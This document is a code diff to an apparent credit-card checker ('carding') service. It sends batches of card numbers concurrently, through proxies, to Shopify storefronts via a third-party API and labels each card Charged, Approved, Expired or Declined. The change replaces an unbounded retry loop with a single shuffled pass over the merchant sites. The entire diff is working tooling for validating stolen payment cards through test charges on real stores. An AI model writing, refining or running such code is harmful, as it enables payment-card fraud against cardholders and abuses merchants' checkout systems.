@@ -20,11 +20,10 @@ async def check_cards(data: dict):
     proxy = data.get("proxy", "")
     api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
     concurrency = data.get("concurrency", 50)
-    sites = data.get("sites", [])  # sites sent from bot!
+    sites = data.get("sites", [])
     
     api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
     
-    # If no sites sent, use default
     if not sites:
         sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
     
@@ -51,7 +50,7 @@ async def check_cards(data: dict):
                     break
                 
                 async with semaphore:
-                    result = await check_card_forever(session, api, card, sites)
+                    result = await check_card_smart(session, api, card, sites)
                     results.append(result)
                     checked += 1
                     if result["status"] == "Charged":
@@ -77,20 +76,17 @@ async def check_cards(data: dict):
         "api_used": api_name
     }
 
-async def check_card_forever(session, api, card, sites):
-    """Keep trying different sites until we get a VALID response"""
+async def check_card_smart(session, api, card, sites):
+    """Try each site once. If no valid response, return Declined."""
     
-    attempt = 0
-    site_index = 0
+    shuffled = list(sites)
+    random.shuffle(shuffled)
     
-    while True:
-        attempt += 1
-        current = sites[site_index % len(sites)]
-        current_site = current.get("url", current) if isinstance(current, dict) else current
-        site_index += 1
+    for attempt, site_obj in enumerate(shuffled):
+        site_url = site_obj.get("url", site_obj) if isinstance(site_obj, dict) else site_obj
         
         try:
-            url = f"{api['url']}?site={current_site}&cc={card}&key={api['key']}"
+            url = f"{api['url']}?site={site_url}&cc={card}&key={api['key']}"
             
             async with session.get(url) as resp:
                 text = await resp.text()
@@ -101,63 +97,24 @@ async def check_card_forever(session, api, card, sites):
                 except:
                     response_text = text.lower()
                 
+                # Valid final response
                 if 'charged' in response_text and 'no_product' not in response_text:
-                    return {
-                        "card": card,
-                        "status": "Charged",
-                        "message": text[:500],
-                        "gateway": "Shopify",
-                        "price": extract_price(text),
-                        "site": current_site,
-                        "attempts": attempt
-                    }
+                    return {"card": card, "status": "Charged", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url, "attempts": attempt + 1}
                 elif 'approved' in response_text:
-                    return {
-                        "card": card,
-                        "status": "Approved",
-                        "message": text[:500],
-                        "gateway": "Shopify",
-                        "price": extract_price(text),
-                        "site": current_site,
-                        "attempts": attempt
-                    }
+                    return {"card": card, "status": "Approved", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url, "attempts": attempt + 1}
                 elif 'expired' in response_text:
-                    return {
-                        "card": card,
-                        "status": "Expired",
-                        "message": text[:500],
-                        "gateway": "Shopify",
-                        "price": extract_price(text),
-                        "site": current_site,
-                        "attempts": attempt
-                    }
+                    return {"card": card, "status": "Expired", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url, "attempts": attempt + 1}
                 elif 'card_declined' in response_text or 'declined' in response_text:
-                    return {
-                        "card": card,
-                        "status": "Declined",
-                        "message": text[:500],
-                        "gateway": "Shopify",
-                        "price": extract_price(text),
-                        "site": current_site,
-                        "attempts": attempt
-                    }
+                    return {"card": card, "status": "Declined", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url, "attempts": attempt + 1}
                 
-                await asyncio.sleep(0.3)
+                # NO_PRODUCT etc -> try next site
                 continue
         
         except Exception as e:
-            if attempt > 1000:
-                return {
-                    "card": card,
-                    "status": "Error",
-                    "message": str(e)[:200],
-                    "gateway": "Shopify",
-                    "price": "-",
-                    "site": current_site,
-                    "attempts": attempt
-                }
-            await asyncio.sleep(0.3)
             continue
+    
+    # Tried all sites, none returned valid response
+    return {"card": card, "status": "Declined", "message": "All sites returned NO_PRODUCT", "gateway": "Shopify", "price": "-", "attempts": len(shuffled)}
 
 def extract_price(text):
     import re
